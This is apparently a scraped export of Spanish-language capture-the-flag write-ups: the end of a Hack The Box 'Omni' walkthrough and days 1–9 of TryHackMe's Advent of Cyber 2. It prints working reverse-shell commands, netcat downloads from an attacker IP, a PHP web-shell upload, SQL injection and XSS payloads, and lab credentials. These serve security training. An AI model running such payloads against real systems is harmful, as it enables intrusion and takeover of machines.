https://nmap.org/submit/ . # Nmap done at Sat Sep 12 16:56:07 2020 -- 1 IP address (1 host up) scanned in 74.96 seconds   HTTP 8080 Encontramos una pagina que pregunta por credenciales y muestra el mensaje Windows Device Portal.\nSIREPRAT Investigamos acerca de este \u0026ldquo;Portal\u0026rdquo; y encontramos que es un portal para dispositivos IoT. Encontramos una herramienta con la cual es posible realizar ejecucion de comandos en la maquina: SirepRAT.\nEn caso de error instalar:\n1  pip install enum34   Ejecutamos esta herramienta para obtener el archivo hosts de windows, el cual logramos obtener.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path \u0026#34;C:\\Windows\\System32\\drivers\\etc\\hosts\u0026#34; --v --------- # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. #\t127.0.0.1 localhost #\t::1 localhost --------- \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0\u0026gt; \u0026lt;FileResult | type: 31, payload length: 824, payload peek: \u0026#39;# Copyright (c) 1993-2009 Microsoft Corp.## Th\u0026#39;\u0026gt;   Ahora que tenemos acceso vamos a ejecutar una shell inversa con netcat, primero descargamos netcat aunque la version que tiene Kali no funcionó en la maquina por lo que descargamos la version de 64 bits.\n1 2 3 4  kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#39; /c \\\\10.10.14.44\\TMP\\nc.exe -e C:\\Windows\\System32\\cmd.exe 10.10.14.44 1338\u0026#39; \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0\u0026gt; \u0026lt;OutputStreamResult | type: 11, payload length: 295, payload peek: \u0026#39;You can\u0026#39;t connect to the file share because it\u0026#39;s n\u0026#39;\u0026gt; \u0026lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: \u0026#39;\u0026#39;\u0026gt;   Descargamos, ponemos a la escucha netcat, ejecutamos nuestra shell inversa y logramos obtener una shell con el usuario DefaultAccount pero si no le pasamos el parametro --as_logged_on_user obtenemos una shell con usuario omni$.\n1 2 3 4 5 6  #Descarga de netcat python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#39; /c powershell -c \u0026#34;\u0026amp; { iwr 10.10.14.44/nc64.exe -OutFile C:\\Data\\Users\\DefaultAccount\\nc64.exe }\u0026#34;\u0026#39; #Ejecutar shell inversa python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#39; /c powershell -c C:\\Data\\Users\\DefaultAccount\\nc64.exe -e cmd.exe 10.10.14.44 443\u0026#39;   Tenemos acceso a los directorios de los usuarios y encontramos la flag user.txt y root.txt con el usuario omni$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  C:\\Data\\Users\u0026gt;dir app dir app Volume in drive C is MainOS Volume Serial Number is 3C37-C677 Directory of C:\\Data\\Users\\app 07/04/2020 09:53 PM \u0026lt;DIR\u0026gt; . 07/04/2020 09:53 PM \u0026lt;DIR\u0026gt; .. 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; 3D Objects 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Documents 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Downloads 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Favorites 07/04/2020 08:20 PM 344 hardening.txt 07/04/2020 08:14 PM 1,858 iot-admin.xml 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Music 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Pictures 07/04/2020 09:53 PM 1,958 user.txt 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Videos 3 File(s) 4,160 bytes 9 Dir(s) 4,692,164,608 bytes free C:\\Data\\Users\u0026gt;cd app cd app C:\\Data\\Users\\app\u0026gt;type user.txt type user.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; C:\\Data\\Users\\app\u0026gt; C:\\Data\\Users\u0026gt;cd administrator cd administrator C:\\Data\\Users\\administrator\u0026gt;dir dir Volume in drive C is MainOS Volume Serial Number is 3C37-C677 Directory of C:\\Data\\Users\\administrator 07/04/2020 09:48 PM \u0026lt;DIR\u0026gt; . 07/04/2020 09:48 PM \u0026lt;DIR\u0026gt; .. 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; 3D Objects 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Documents 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Downloads 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Favorites 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Music 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Pictures 07/04/2020 09:48 PM 1,958 root.txt 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Videos 1 File(s) 1,958 bytes 9 Dir(s) 4,692,164,608 bytes free C:\\Data\\Users\\administrator\u0026gt;type root.txt type root.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt;   Intentamos obtener las flags pero no fue posible:\n1 2 3 4 5 6 7 8 9 10 11 12  PS C:\\Data\\Users\\app\u0026gt; $credential = Import-CliXml -Path U:\\Users\\app\\user.txt $credential = Import-CliXml -Path U:\\Users\\app\\user.txt Import-CliXml : Error occurred during a cryptographic operation. At line:1 char:15 + $credential = Import-CliXml -Path U:\\Users\\app\\user.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Import-Clixml], Cryptographic Exception + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept ion,Microsoft.PowerShell.Commands.ImportClixmlCommand PS C:\\Data\\Users\\app\u0026gt;   Encontramos un archivo el cual contiene unas credenciales del usuario app y Administrator:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  PS C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement\u0026gt; ls -force ls -force Directory: C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 10/26/2018 11:37 PM 1.0.0.1 -a-h-- 8/21/2020 12:56 PM 247 r.bat PS C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement\u0026gt; type r.bat type r.bat @echo off :LOOP for /F \u0026#34;skip=6\u0026#34; %%i in (\u0026#39;net localgroup \u0026#34;administrators\u0026#34;\u0026#39;) do net localgroup \u0026#34;administrators\u0026#34; %%i /delete net user app mesh5143 net user administrator _1nt3rn37ofTh1nGz ping -n 3 127.0.0.1 cls GOTO :LOOP :EXIT PS C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement\u0026gt;   Intentamos utilizar estas con EvilWinrm pero no fue posible ingresar por este servicio. Utilizamos las credenciales en la pagina y nos muestra un portal (Windows IoT Core) de administracion.\nAPP - USER Encontramos un apartado donde podemos realizar una ejecucion de comandos.\nEjecutamos una shell inversa para tener acceso con el usuario app.\n1  powershell -c \u0026#34;\u0026amp; { iwr 10.10.14.44/nc64.exe -OutFile C:\\Data\\Users\\app\\nc64.exe}\u0026#34; \u0026amp; powershell -c C:\\Data\\Users\\app\\nc64.exe -e cmd.exe 10.10.14.44 1335   La primera vez al ejecutar la lectura de la flag nos dio error por lo que tuvimos que verificar el disco duro el cual no era C si no U.\n1 2 3 4 5 6 7 8 9 10 11 12 13  PS C:\\Data\\Users\\app\u0026gt; $credential = Import-CliXml -Path C:\\Users\\app\\user.txt $credential = Import-CliXml -Path C:\\Users\\app\\user.txt Import-CliXml : Could not find a part of the path \u0026#39;C:\\Users\\app\\user.txt\u0026#39;. At line:1 char:15 + $credential = Import-CliXml -Path C:\\Users\\app\\user.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OpenError: (:) [Import-Clixml], DirectoryNotFoun dException + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.Im portClixmlCommand PS C:\\Data\\Users\\app\u0026gt;   Ejecutamos y leemos nuestra flag.\n1 2 3 4 5  PS C:\\Data\\Users\\app\u0026gt; $credential = Import-CliXml -Path U:\\Users\\app\\user.txt $credential = Import-CliXml -Path U:\\Users\\app\\user.txt PS C:\\Data\\Users\\app\u0026gt; $credential.GetNetworkCredential().Password $credential.GetNetworkCredential().Password 7cfd50[... REDACTED ...]05ad9d70   ADMINISTRATOR - USER Ahora ejecutamos una shell inversa con el usuario Administrador y de la misma forma logramos obtener la flag root.txt.\n1 2 3 4  PS C:\\Data\\Users\\administrator\u0026gt; $credential = Import-CliXml -Path U:\\Users\\administrator\\root.txt PS C:\\Data\\Users\\administrator\u0026gt; $credential.GetNetworkCredential().Password 5dbd[... REDACTED ...]6e9bf11d PS C:\\Data\\Users\\administrator\u0026gt;   ","description":"Omni es una maquina de HackTheBox diferente ya que encontramos un SO Windows IOT, descubrimos que existe una vulnerabilidad la cual aprovechamso para ejecutar una shell inversa. Enumerando diferentes archivos encontramos credenciales almacenadas que nos permitieron ingresar al Portal y obtener acceso privilegiado.","id":26,"section":"posts","tags":["sireprat"],"title":"Hack The Box - Omni","uri":"https://sckull.github.io/posts/omni/"},{"content":"  Advent of Cyber 2 de TryHackMe contiene una serie de retos orientados al aprendizaje de herramientas y conceptos de seguridad, liberados diariamente durante 25 dias.\nInformacion    Titulo Advent of Cyber 2     Room Advent of Cyber 2   Info Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.   Maker TryHackMe \u0026amp; cmnatic \u0026amp; DarkStar7471 \u0026amp; JohnHammond \u0026amp; Tib3rius \u0026amp; TCM   URL TryHackMe - AoC2    DAY 1 - Web Exploitation Presentan una web donde es necesario crear una cuenta y obtener diferentes valores.\nPrimero es necesario crear una cuenta, luego de eso ingresar con las credenciales, y con la herramienta para desarrolladores de firefox obtenemos la cookie y el nombre de la misma.\n1  auth:7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22757365726e616d65227d   Utilizando CyberCheff logramos obtener el valor real de la cookie el cual esta codificado en hexadecimal y esta en formato json.\n1  {\u0026#34;company\u0026#34;:\u0026#34;The Best Festival Company\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;username\u0026#34;}   Para poder realizar un \u0026ldquo;bypass\u0026rdquo; utilizamos el formato de la cookie y la codificacion utilizada, pasandole como usuario santa y codificandola nuevamente.\n1 2  {\u0026#34;company\u0026#34;:\u0026#34;The Best Festival Company\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;santa\u0026#34;} 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d   Utilizando nuevamente la herramienta para desarrolladores de firefox en la seccion de Storage \u0026gt; Cookies, creamos una nueva cookie con los valores:\n1 2  Name: auth value: 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d   Al recargar la pagina nos muestra las opciones pero en esta ocacion podemos activar todas y obtener nuestra flag.\nDAY 2 - Web Exploitation Presentan un reto del tipo web donde nos dan un ID para auditar la aplicacion. Además se presenta un mensaje que indica que debemos de pasar el ID al parametro ?id= a la aplicacion\n1 2 3  For Elf McEager: You have been assigned an ID number for your audit of the system: ODIzODI5MTNiYmYw . Use this to gain access to the upload section of the site. Good luck!   Al pasarle el valor (/?id=ODIzODI5MTNiYmYw) nos muestra una pagina nueva que permite seleccionar un archivo ha subir.\nEn el codigo fuente de la pagina se muestra las extensiones aceptadas (.jpeg,.jpg,.png) de los archivos.\n1 2 3 4 5 6 7 8 9 10 11 12  \u0026lt;body\u0026gt; \u0026lt;ul class=\u0026#34;lightrope\u0026#34;\u0026gt;\u0026lt;li\u0026gt;[... snip ...]\u0026lt;/li\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;div class=nose\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt;Protect the Factory!\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;If you see any suspicious people near the factory, take a picture and upload it here!\u0026lt;/h2\u0026gt; \u0026lt;input type=file id=\u0026#34;chooseFile\u0026#34; accept=\u0026#34;.jpeg,.jpg,.png\u0026#34;\u0026gt; \u0026lt;button tabindex=0 id=coverFile\u0026gt;Select\u0026lt;/button\u0026gt; \u0026lt;button tabindex=1 id=uploadFile\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;p id=fileText\u0026gt;No file selected\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt;   Al subir una imagen la pagina no muestra ningun mensaje de la direccion donde está almacenada, utilizando la descripcion de File Uploads logramos encontrar la direccion donde se encuentra nuestra imagen.\nPara obtener nuestra flag creamos un archivo que contiene codigo en PHP para poder ejecutar una shell inversa.\n1 2  kali@kali:~/thm/adventcyber2$ cat shell.jpg.php \u0026lt;?php exec(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#39;); ?\u0026gt;   Con netcat a la escucha (rlwrap nc -lvp 1338), subimos nuestro archivo y visitamos el mismo como si fuera un pagina normal, lo cual ejecuto nuestra shell inversa y logramos obtener una shell y nuestra flag.\nDAY 3 - Web Exploitation Nos presentan una pagina a la cual hay que realizar un ataque de fuerza bruta utilizando la herramienta Burpsuite tal y como se presenta en la descripcion del reto. Tambien proveen una lista de usuarios y contraseñas.\n1 2 3 4  Usuario Contraseña root root admin password user 12345   Para realizar el ataque lo hacemos con la extension FoxyProxy o directamente en la configuracion de firefox para dirigir el trafico a Burpsuite mediante su proxy, y con esta herramienta poder manipular los parametros de interes.\nPrimero debemos de enviar un usuario y contraseña, al realizar esto, en burpsuite nos muestra la solicitud a realizar donde vemos los valores enviados. Esta solicitud la enviamos al Intruder donde se muestran las posiciones del usuario y contraseña las cuales son marcadas para poder utilizar y cambiar los diferentes valores de un diccionario en cada solicitud.\nEn la ventana de Payloads pegamos para el primer parametro (usuario, payload set = 1) la lista dada o en el caso de que esté en un archivo se carga el mismo. Se configura el segundo parametro (contraseña, payload set = 1 ) y se cargan la lista o archivo, al tener estos valores configurados se lanza el ataque (En caso de que sea la version gratuita de burpsuite solo configurar una posicion e intercambiar el nombre de usuario o contraseña manualmente, al ser una lista pequeña no toma mucho tiempo). Al finalizar se muestra la lista de solicitudes, en una de ellas se muestra un mensaje diferente a los demas, donde indica que se encontró la contraseña.\nUtilizamos usuario y contraseña encontrado para obtener nuestra flag en la pagina.\nDAY 4 - Web Exploitation Este dia presentan un reto web que incluye la explicacion del uso de herramientas WFUZZ y GOBUSTER para realizar fuzzing en paginas web. Tambien presentan que el parametro (date) del reto toma como valor una fecha en el formato YYYYMMDD.\nPara obtener la flag, primero es necesario ejecutar gobuster a la pagina web con el diccionario big.txt el cual nos muestra como resultado una direccion donde se encuentra una pagina web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.57.57/ -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.57.57/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/12 13:37:27 Starting gobuster =============================================================== /.htpasswd (Status: 403) /.htaccess (Status: 403) /LICENSE (Status: 200) /api (Status: 301) /server-status (Status: 403) =============================================================== 2020/12/12 13:50:52 Finished ===============================================================   A dicha pagina web es necesario realizar fuzzing al parametro date para ello debemos de utilizar algun diccionario que contenga el formato YYYYMMDD, en este caso utilizamos python para generar nuestro diccionario en el formato presentado especificando año, mes y dia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #!/usr/bin/env python for i in range(1990, 2021): for j in range(1,13): for k in range(1,32):\ty = str(i) m = \u0026#39;0\u0026#39; + str(j) if j \u0026lt; 10 else str(j) d = \u0026#39;0\u0026#39; + str(k) if k \u0026lt; 10 else str(k)\tprint(y+m+d) i+=1 j+=1 k+=1 # python dates.py \u0026gt; dates.txt   Utilizamos WFUZZ para pasarle los valores del diccionario al parametro date y ocultamos todas las solicitudes que tuvieran 0 caracteres (--hh 0), logrando obtener la fecha en donde se presenta nuestra flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  kali@kali:~/thm/adventcyber2$ wfuzz -c -z file,dates.txt --hh 0 http://10.10.57.57/api/site-log.php?date=FUZZ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4.5 - The Web Fuzzer * ******************************************************** Target: http://10.10.57.57/api/site-log.php?date=FUZZ Total requests: 11532 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000011495: 200 0 L 1 W 13 Ch \u0026#34;20201125\u0026#34; Total time: 419.2043 Processed Requests: 11532 Filtered Requests: 11531 Requests/sec.: 27.50925   DAY 5 - Web Exploitation Se presenta una aplicacion web vulnerable a SQLi de la cual nos dan la \u0026ldquo;documentacion\u0026rdquo;:\nSanta\u0026rsquo;s TODO: Look at alternative database systems that are better than sqlite. Also, don\u0026rsquo;t forget that you installed a Web Application Firewall (WAF) after last year\u0026rsquo;s attack. In case you\u0026rsquo;ve forgotten the command, you can tell SQLMap to try and bypass the WAF by using \u0026ndash;tamper=space2comment\nEn la primera tarea preguntan por el panel de logeo, la pista dada es suficiente para obtener la respuesta. En el panel realizamos \u0026ldquo;bypass\u0026rdquo; utilizando el payload ' or true; -- en el campo de username.\nDentro de la aplicacion enviamos el payload ' ORDER BY 1-- el cual hizo retornar los valores de la base de datos.\nUtilizando SQLMAP y Burpsuite para obtener los datos de la base de datos tal y como se explica en la descripcion del reto de este dia, tomando en cuenta que la aplicacion cuenta con un WAF utilizamos un tamper para \u0026ldquo;camuflar\u0026rdquo; los payloads y como base de datos se especifica que es sqlite como lo indica la \u0026ldquo;documentacion\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  #sqlmap -r santaspanel.txt --dbms=sqlite --tamper=space2comment --dump-all Database: SQLite_masterdb Table: users [1 entry] +------------------+----------+ | password | username | +------------------+----------+ | EhCNSWzzFP6sc7gB | admin | +------------------+----------+ Database: SQLite_masterdb Table: sequels [22 entries] +-------------+-----+----------------------------+ | kid | age | title | +-------------+-----+----------------------------+ | James | 8 | shoes | | John | 4 | skateboard | | Robert | 17 | iphone | | Michael | 5 | playstation | | William | 6 | xbox | | David | 6 | candy | | Richard | 9 | books | | Joseph | 7 | socks | | Thomas | 10 | 10 McDonalds meals | | Charles | 3 | toy car | | Christopher | 8 | air hockey table | | Daniel | 12 | lego star wars | | Matthew | 15 | bike | | Anthony | 3 | table tennis | | Donald | 4 | fazer chocolate | | Mark | 17 | wii | | Paul | 9 | github ownership | | James | 8 | finnish-english dictionary | | Steven | 11 | laptop | | Andrew | 16 | rasberry pie | | Kenneth | 19 | TryHackMe Sub | | Joshua | 12 | chair | +-------------+-----+----------------------------+ Database: SQLite_masterdb Table: hidden_table [1 entry] +-----------------------------------------+ | flag | +-----------------------------------------+ | thmfox{All_I_Want_for_Christmas_Is_You} | +-----------------------------------------+   DAY 6 - Web Exploitation La aplicacion dada es vulnerable a XSS y utilizando OWASP ZAP es posible obtener las diferentes alertas de XSS. Para responder las preguntas de este reto es necesario explotar el campo New Book... y utilizar OWASP ZAP.\n1  \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;   DAY 7 - Networking Se un archivo comprimido con varios archivos de captura de paquetes a los cuales hay que realizar un analisis utilizando wireshark y los filtros descritos y explicados en la descripcion del reto del dia.\n  La IP que realiza ping (archivo: pcap1.pcap).\n  Post Visitado por la ip 10.10.67.199 utilizando el filtro http.request.method == GET, tambien se puede incluir la ip en el filtro http.request.method == GET \u0026amp;\u0026amp; ip.src == 10.10.67.199 (archivo: pcap1.pcap).\n  Utilizando el filtro tcp.port==21 para las peticiones en el puerto 21 de FTP y leer la contraseña (archivo: pcap2.pcap).\n  Protocolo encriptado: SSH (archivo: pcap2.pcap).\n  Que hay en la lista de deseos de Elf McSkidy, exportando los archivos (objetos) en el protocolo HTTP (archivo: pcap3.pcap).\n  DAY 8 - Networking Se presenta una IP en la cual hay que realizar un escaneo de puertos, sistema operativo y ejecutar scripts con nmap. Tambien una serie de preguntas relacionada a sintaxis e informacion obtenida.\n  Creacion de Snort: Snort\n  Puertos abiertos con un simple scan.\n  1 2 3 4 5 6 7 8 9 10 11  #nmap tbfc.blog Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-14 11:07 EST Nmap scan report for tbfc.blog (10.10.1.235) Host is up (0.32s latency). Not shown: 997 closed ports PORT STATE SERVICE 80/tcp open http 2222/tcp open EtherNetIP-1 3389/tcp open ms-wbt-server Nmap done: 1 IP address (1 host up) scanned in 26.97 seconds     Determinar el Sistema operativo: nmap -O tbfc.blog\n  Determinar para que esta oreintada la Aplicacion web con el script http-title: blog.\n  1 2 3 4 5 6 7 8 9 10  kali@kali:~/thm/adventcyber2$ nmap --script http-title -p 80 tbfc.blog Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-14 11:12 EST Nmap scan report for tbfc.blog (10.10.1.235) Host is up (0.79s latency). PORT STATE SERVICE 80/tcp open http |_http-title: TBFC\u0026amp;#39;s Internal Blog Nmap done: 1 IP address (1 host up) scanned in 3.74 seconds   DAY 9 - Networking Un servicio FTP esta expuesto en la IP del reto en la cual se ingresa como \u0026ldquo;anonymous\u0026rdquo;, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas y obtener la flag. En la primera pestaña tenemos la conexion con el servicio donde logramos obtener el archivo backup.sh y shoppinglist.txt, el archivo backup se ejecuta cada cierto tiempo, agregamos una shell inversa y volvimos a subir el archivo en el servicio FTP, con netcat a la escucha logramos obtener una shell y nuestra flag root.txt.\nbash bash  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  kali@kali:~/thm/adventcyber2$ ftp 10.10.99.86 Connected to 10.10.99.86. 220 Welcome to the TBFC FTP Server!. Name (10.10.99.86:kali): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 6 65534 65534 4096 Nov 16 15:06 . drwxr-xr-x 6 65534 65534 4096 Nov 16 15:06 .. drwxr-xr-x 2 0 0 4096 Nov 16 15:04 backups drwxr-xr-x 2 0 0 4096 Nov 16 15:05 elf_workshops drwxr-xr-x 2 0 0 4096 Nov 16 15:04 human_resources drwxrwxrwx 2 65534 65534 4096 Nov 16 19:35 public 226 Directory send OK. ftp\u0026gt; cd public 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 16 19:35 . drwxr-xr-x 6 65534 65534 4096 Nov 16 15:06 .. -rwxr-xr-x 1 111 113 341 Nov 16 19:34 backup.sh -rw-rw-rw- 1 111 113 24 Nov 16 19:35 shoppinglist.txt 226 Directory send OK. ftp\u0026gt; get backup.sh local: backup.sh remote: backup.sh 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.sh (341 bytes). 226 Transfer complete. 341 bytes received in 0.00 secs (660.7298 kB/s) ftp\u0026gt; get shoppinglist.txt local: shoppinglist.txt remote: shoppinglist.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes). 226 Transfer complete. 24 bytes received in 0.00 secs (181.6861 kB/s) ftp\u0026gt; put backup.sh local: backup.sh remote: backup.sh 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 383 bytes sent in 0.00 secs (1.6603 MB/s) ftp\u0026gt;     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  kali@kali:~/thm/adventcyber2$ cat backup.sh #!/bin/bash # Created by ElfMcEager to backup all of Santa\u0026#39;s goodies! # Create backups to include date DD/MM/YYYY filename=\u0026#34;backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz\u0026#34;; # Backup FTP folder and store in elfmceager\u0026#39;s home directory tar -zcvf /home/elfmceager/$filename /opt/ftp # TO-DO: Automate transfer of backups to backup server kali@kali:~/thm/adventcyber2$ cat shoppinglist.txt The Polar Express Movie kali@kali:~/thm/adventcyber2$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; backup.sh kali@kali:~/thm/adventcyber2$ tail backup.sh # Create backups to include date DD/MM/YYYY filename=\u0026#34;backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz\u0026#34;; # Backup FTP folder and store in elfmceager\u0026#39;s home directory tar -zcvf /home/elfmceager/$filename /opt/ftp # TO-DO: Automate transfer of backups to backup server bash -i 